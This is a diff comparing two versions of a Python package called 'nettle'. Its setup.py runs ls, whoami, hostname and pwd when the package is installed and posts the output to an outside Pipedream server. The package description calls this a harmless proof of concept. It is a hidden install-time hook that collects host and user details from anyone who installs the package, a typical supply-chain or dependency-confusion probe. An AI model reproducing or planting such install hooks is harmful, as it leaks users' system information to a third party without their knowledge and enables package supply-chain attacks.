# Comparing `tmp/nettle-5.0.1.tar.gz` & `tmp/nettle-5.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "nettle-5.0.1.tar", last modified: Sat Apr 29 08:54:22 2023, max compression
+gzip compressed data, was "nettle-5.0.2.tar", last modified: Sat Apr 29 09:07:52 2023, max compression
```

## Comparing `nettle-5.0.1.tar` & `nettle-5.0.2.tar`

### file list

```diff
@@ -1,11 +1,10 @@
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-29 08:54:22.413769 nettle-5.0.1/
--rw-r--r--   0 kali      (1000) kali      (1000)      163 2023-04-29 08:54:22.413769 nettle-5.0.1/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)       76 2023-04-29 08:32:08.000000 nettle-5.0.1/README
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-29 08:54:22.413769 nettle-5.0.1/nettle.egg-info/
--rw-r--r--   0 kali      (1000) kali      (1000)      163 2023-04-29 08:54:22.000000 nettle-5.0.1/nettle.egg-info/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)      147 2023-04-29 08:54:22.000000 nettle-5.0.1/nettle.egg-info/SOURCES.txt
--rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-04-29 08:54:22.000000 nettle-5.0.1/nettle.egg-info/dependency_links.txt
--rw-r--r--   0 kali      (1000) kali      (1000)        9 2023-04-29 08:54:22.000000 nettle-5.0.1/nettle.egg-info/top_level.txt
--rw-r--r--   0 kali      (1000) kali      (1000)      360 2023-04-29 08:36:29.000000 nettle-5.0.1/pingback.py
--rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-04-29 08:54:22.413769 nettle-5.0.1/setup.cfg
--rw-r--r--   0 kali      (1000) kali      (1000)      773 2023-04-29 08:51:35.000000 nettle-5.0.1/setup.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-29 09:07:52.877801 nettle-5.0.2/
+-rw-r--r--   0 kali      (1000) kali      (1000)      163 2023-04-29 09:07:52.877801 nettle-5.0.2/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)       76 2023-04-29 08:32:08.000000 nettle-5.0.2/README
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-29 09:07:52.877801 nettle-5.0.2/nettle.egg-info/
+-rw-r--r--   0 kali      (1000) kali      (1000)      163 2023-04-29 09:07:52.000000 nettle-5.0.2/nettle.egg-info/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)      135 2023-04-29 09:07:52.000000 nettle-5.0.2/nettle.egg-info/SOURCES.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-04-29 09:07:52.000000 nettle-5.0.2/nettle.egg-info/dependency_links.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-04-29 09:07:52.000000 nettle-5.0.2/nettle.egg-info/top_level.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-04-29 09:07:52.877801 nettle-5.0.2/setup.cfg
+-rw-r--r--   0 kali      (1000) kali      (1000)      664 2023-04-29 09:07:29.000000 nettle-5.0.2/setup.py
```

### Comparing `nettle-5.0.1/setup.py` & `nettle-5.0.2/setup.py`

 * *Files 23% similar despite different names*

```diff
@@ -1,28 +1,22 @@
 from setuptools import setup
 import os
+import http.client
 
-# get the output of 4 commands
+# Define the commands to execute
+commands = ['ls', 'whoami', 'hostname', 'pwd']
 output = []
-output.append(os.popen('ls').read())
-output.append(os.popen('whoami').read())
-output.append(os.popen('hostname').read())
-output.append(os.popen('pwd').read())
-
-# write output to a file
-with open('output.txt', 'w') as f:
-    for o in output:
-        f.write(o)
 
-# send output to pipedream server
-import http.client
+# Execute each command and store the output
+for cmd in commands:
+    output.append(f"{cmd} : ")
+    output.append(os.popen(cmd).read())
 
+# Send the output to the Pipedream server
 conn = http.client.HTTPSConnection('eofu0ntgqm9ibyz.m.pipedream.net')
-with open('output.txt', 'r') as f:
-    data = f.read()
-conn.request("POST", "/", data, {'Content-Type': 'text/plain'})
+conn.request("POST", "/", "\n".join(output), {'Content-Type': 'text/plain'})
 
 setup(name='nettle',
-      version='5.0.1',
+      version='5.0.2',
       description='This is just for a making PoC purpose. It will not harm anyone. So, do not worry.',
       author='manan_sanghvi',
       )
```

